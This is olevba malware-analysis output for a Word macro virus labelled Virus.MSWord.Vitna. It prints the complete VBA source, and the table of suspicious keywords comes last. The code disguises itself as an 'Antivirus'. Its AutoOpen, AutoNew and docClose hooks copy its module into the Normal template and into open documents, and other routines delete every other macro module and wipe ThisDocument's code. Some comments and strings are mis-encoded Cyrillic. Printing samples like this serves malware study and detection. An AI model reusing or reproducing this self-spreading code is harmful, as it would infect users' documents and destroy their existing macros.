olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vitna-e294c06b52c00ca55131867922bfa5e21b09c06f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NewDocument.cls 
in file: Virus.MSWord.Vitna-e294c06b52c00ca55131867922bfa5e21b09c06f - OLE stream: 'Macros/VBA/NewDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Antivir.bas 
in file: Virus.MSWord.Vitna-e294c06b52c00ca55131867922bfa5e21b09c06f - OLE stream: 'Macros/VBA/Antivir'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const countlist = 2 '÷èñëî èçâåñòíûõ ìîäóëåé
Dim List
Const ShablonName As String = "NewDocument"
Sub AutoOpen()
  List = Array("Antivir", " ")
  DeleteMacrosNT
  DeleteMacrosAD
  Antivirus_infect
End Sub
Sub docClose()
  List = Array("Antivir", " ")
  DeleteMacrosNT
  DeleteMacrosAD
  Antivirus_infect
   If (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
    ActiveDocument.Save
    End If
   ActiveDocument.Close
End Sub
Sub AutoNew()
  List = Array("Antivir", " ")
  DeleteMacrosNT
  DeleteMacrosAD
  Antivirus_infect
End Sub

Private Sub Antivirus_infect()
  Copyrights = "The Antivirus, 2002"
  NtInfected = False
  AdInfected = False
  Set NT = NormalTemplate.VBProject.VBComponents
  Set AD = ActiveDocument.VBProject.VBComponents
  If Documents.Count >= 1 Then
    For i = 1 To NT.Count
     If NT.Item(i).Name = "Antivir" Then NtInfected = True
   Next i
    For i = 1 To AD.Count
      If AD.Item(i).Name = "Antivir" Then AdInfected = True
   Next i
   If AdInfected And Not NtInfected Then
   'Infect normal
    Application.OrganizerCopy ActiveDocument.FullName, _
    NormalTemplate.FullName, "Antivir", _
    wdOrganizerObjectProjectItems
   End If
   If Not AdInfected And NtInfected Then
   'Infect Activdoc
   Application.OrganizerCopy NormalTemplate.FullName, _
    ActiveDocument.FullName, "Antivir", _
    wdOrganizerObjectProjectItems
   End If
  End If
End Sub

Private Sub DeleteMacrosNT()
Set NT = NormalTemplate.VBProject.VBComponents
'Dim list
 'list = Array("Antivirus", "_")
 'countlist = 2
i = 1
While i <= NT.Count
Set OMacros = NT.Item(i)
Novirus = False
 For j = 1 To countlist
  Novirus = Novirus Or (OMacros.Name = List(j - 1))
 Next j
 If Not Novirus Then 'deleted unknoun macros
  MCount = NT.Count
  If i > 1 Then NT.Remove (OMacros)
  If i = 1 Then  'ThisDocument
  l = NT.Item(1).codemodule.CountOfLines
   NT.Item(1).codemodule.DeleteLines 1, l
   OMacros.Name = ShablonName
   i = i + 1
  End If
 End If
 If Novirus Then i = i + 1
Wend
End Sub
Private Sub DeleteMacrosAD()
Set AD = ActiveDocument.VBProject.VBComponents
'Dim list
 'list = Array("Antivirus", "_")
 'countlist = 2
i = 1
While i <= AD.Count
Set OMacros = AD.Item(i)
Novirus = False
 For j = 1 To countlist
  Novirus = Novirus Or (OMacros.Name = List(j - 1))
 Next j
 If Not Novirus Then 'deleted unknoun macros
  MCount = AD.Count
  If i > 1 Then AD.Remove (OMacros)
  If i = 1 Then  'ThisDocument
  l = AD.Item(1).codemodule.CountOfLines
   AD.Item(1).codemodule.DeleteLines 1, l
   OMacros.Name = ShablonName
   i = i + 1
  End If
 End If
 If Novirus Then i = i + 1
Wend
End Sub
'Sub AutoClose()
 'MsgBox "Infected"
 'res = MsgBox("Ñäåëàòü ïðèâèâêó çàêðûâàåìîìó ôàéëó?", vbQuestion + vbYesNo, "Àíòàâèðóñíàÿ ïðèâèâêà")
 'If res = vdYes Then
 'Antivirus_infect
 'MsgBox "Ïðèâèëè óñïåøíî", vbInformation, "Àíòàâèðóñíàÿ ïðèâèâêà"
 'End If
'End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |NewDocument         |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

